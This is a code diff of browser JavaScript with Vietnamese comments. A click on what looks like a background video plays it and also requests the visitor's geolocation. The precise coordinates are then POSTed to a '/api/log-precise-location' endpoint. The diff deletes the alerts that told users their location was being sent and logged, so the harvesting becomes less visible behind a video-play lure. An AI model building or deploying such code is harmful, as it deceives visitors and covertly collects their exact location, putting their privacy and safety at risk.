@@ -1,14 +1,27 @@
+// Lấy các element cần thiết từ HTML
+const triggerElement = document.getElementById("location-trigger");
+const videoElement = document.querySelector(".background-video");
+const playIcon = document.querySelector(".fa-play");
+
 // Lắng nghe sự kiện click vào khu vực "video"
-document.getElementById("location-trigger").addEventListener("click", () => {
+triggerElement.addEventListener("click", () => {
+  // Nếu video đang dừng thì cho phát và ẩn nút play đi
+  if (videoElement.paused) {
+    videoElement.play();
+    playIcon.style.display = "none"; // Ẩn nút play
+  }
+
+  // Logic hỏi quyền vị trí vẫn giữ nguyên
   console.log("Khu vực video được click, chuẩn bị hỏi quyền vị trí...");
   requestLocationPermission();
 });
+
+// --- CÁC HÀM BÊN DƯỚI GIỮ NGUYÊN KHÔNG THAY ĐỔI ---
 
 function requestLocationPermission() {
   // Kiểm tra xem trình duyệt có hỗ trợ Geolocation không
   if ("geolocation" in navigator) {
     // Nếu có, gọi hàm để lấy vị trí
-    // Hàm này sẽ tự động bật pop-up của trình duyệt
     navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
   } else {
     alert("Rất tiếc, trình duyệt của bạn không hỗ trợ lấy vị trí.");
@@ -20,18 +33,15 @@ function successCallback(position) {
   const lat = position.coords.latitude;
   const lon = position.coords.longitude;
 
-  // Console ra để bạn kiểm tra trước
-  console.log(`Vị trí chính xác đã lấy được: ${lat}, ${lon}`);
-  alert(`Vị trí chính xác: ${lat}, ${lon}. Đang gửi lên server để ghi log...`);
+  console.log(`Lấy vị trí thành công: Lat ${lat}, Lon ${lon}`);
+  alert(`Cảm ơn bạn đã cấp quyền! Vị trí của bạn là: ${lat}, ${lon}`);
 
-  // DÙNG FETCH ĐỂ GỬI TỌA ĐỘ LÊN SERVER
-  // Chúng ta sẽ tạo một API mới trên server tên là 'log-precise-location'
+  // Gửi tọa độ lên server để ghi log
   fetch("/api/log-precise-location", {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
     },
-    // Gửi tọa độ đi trong body của request
     body: JSON.stringify({ latitude: lat, longitude: lon }),
   })
     .then((response) => {
@@ -42,11 +52,9 @@ function successCallback(position) {
     })
     .then((data) => {
       console.log("Phản hồi từ server:", data);
-      alert("Đã ghi log vị trí chính xác thành công!");
     })
     .catch((error) => {
       console.error("Lỗi khi gửi vị trí lên server:", error);
-      alert("Có lỗi xảy ra khi ghi log vị trí.");
     });
 }
 
